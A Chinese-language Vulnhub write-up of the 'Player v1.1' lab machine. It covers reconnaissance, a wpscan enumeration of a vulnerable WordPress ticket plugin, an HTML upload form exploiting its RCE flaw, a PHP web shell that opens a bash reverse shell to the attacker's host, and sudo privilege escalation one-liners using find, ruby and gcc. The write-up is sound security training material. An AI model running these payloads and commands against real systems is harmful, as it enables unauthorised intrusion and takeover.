---
layout: post
title: "Player v1.1 walkthrough"
date: 2021-02-14
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP            |
| ------------- | ------------- |
| 本机（Win10） | `172.20.10.5` |
| Kali          | `172.20.10.4` |
| Player-v1.1   | `172.20.10.2` |

### 扫描端口和版本信息

`nmap -A 172.20.10.2`

![1]({{ '/player_v1.1/1.png' | prepend: site.url }})


### 目录枚举

`dirb http://172.20.10.2`只得到一个200路径: `http://172.20.10.2/javascript/jquery/jquery`，不过结果没什么作用,之后在默认界面找到一个链接：`http://172.20.10.2/g@web`，并且在该页面（`http://172.20.10.2/g@web/index.php/author/wp-local/`）中得到一个信息

> AUTHOR: WP-LOCAL
>
> you can upgrade you shell using hackNos@9012!!

得到一个账户名：*wp-local*, 不过暴力破解密码走不通。此外猜测 `hackNos@9012!!`是一个密码，在提 shell会用到

![2]({{ '/player_v1.1/2.png' | prepend: site.url }})


### 访问 Web 并确定 Web 应用

![3]({{ '/player_v1.1/3.png' | prepend: site.url }})

打开网站我们知道使用的 Wordpress，那么就用 *wpscan* 工具来扫描应用

`wpscan --url http://172.20.10.2/g@web -e ap`


```
...
[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: http://172.20.10.2/g@web/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 – Authenticated SQL Injection
 |     Fixed in: 8.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757
 |      - https://www.exploit-db.com/exploits/40939/
 |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/
 |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution (RCE)
 |     Fixed in: 8.0.8
 |     References:
 |      - https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1
 |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 9.0.3 - Multiple Authenticated SQL Injection
 |     Fixed in: 9.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/cbbdb469-7321-44e4-a83b-cac82b116f20
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131
 |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md
 |      - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 9.1.2 - Stored XSS
 |     Fixed in: 9.1.2
 |     References:
 |      - https://wpscan.com/vulnerability/e406c3e8-1fab-41fd-845a-104467b0ded4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15331
 |      - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/
 |      - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 - Privilege Escalation
 |     Fixed in: 8.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f
 |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
 |      - https://packetstormsecurity.com/files/140413/
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution
 |     Fixed in: 8.0.8
 |     References:
 |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f
 |      - https://plugins.trac.wordpress.org/changeset/1763596
 |
 | Version: 7.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.20.10.2/g@web/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://172.20.10.2/g@web/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 ... 
```

根据结果可知 Wordpress 版本是 5.3.6，并且插件 **WP Support Plus Responsive Ticket System** 存在多个漏洞。毫无疑问利用 [RCE](https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1) 漏洞是最佳选择。之后将该 payload 保存为 HTML 文件，本地打开后上传 PHP shell 文件

```html
<form method="post" enctype="multipart/form-data" action="https://example.com/wp-admin/admin-ajax.php">
    <input type="hidden" name="action" value="wpsp_upload_attachment">
    Choose a file ending with .phtml:
    <input type="file" name="0">
    <input type="submit" value="Submit">
</form>
```

PHP shell 文件可以写成

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/172.20.10.4/4455 0>&1'");
?>
```

### Getshell

浏览器打开上传成功的文件，并且在 Kali上监听 *4455* 端口

![4]({{ '/player_v1.1/4.png' | prepend: site.url }})

拿到 shell 后查看 *passwd* 文件得知该系统上有三个账户：*security*，*hackNos-boat*和 *hunter*

之后试了几个账户和密码，最后试出 `security:hackNos@9012!!`可以登录 *security* 账户

### 提权

![5]({{ '/player_v1.1/5.png' | prepend: site.url }})

接下来就是熟悉的操作

`sudo -u hackNos-boat find . -exec /bin/bash -p \; -quit`

切换到 *hackNos-boat* 账户后再执行一遍 `sudo -l`

```bash
sudo -l
Matching Defaults entries for hackNos-boat on hacknos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hackNos-boat may run the following commands on hacknos:
    (hunter) NOPASSWD: /usr/bin/ruby
```

通过 *hunter* 账户执行 */usr/bin/ruby* 命令来切换账户

`sudo -u hanter /usr/bin/ruby -e 'exec "/bin/bash"'`

同理，最终提权到 *root* 账户

`sudo /usr/bin/gcc -wrapper /bin/bash,-s .`

最终读取到 *root* 账户下的文件

![6]({{ '/player_v1.1/6.png' | prepend: site.url }})

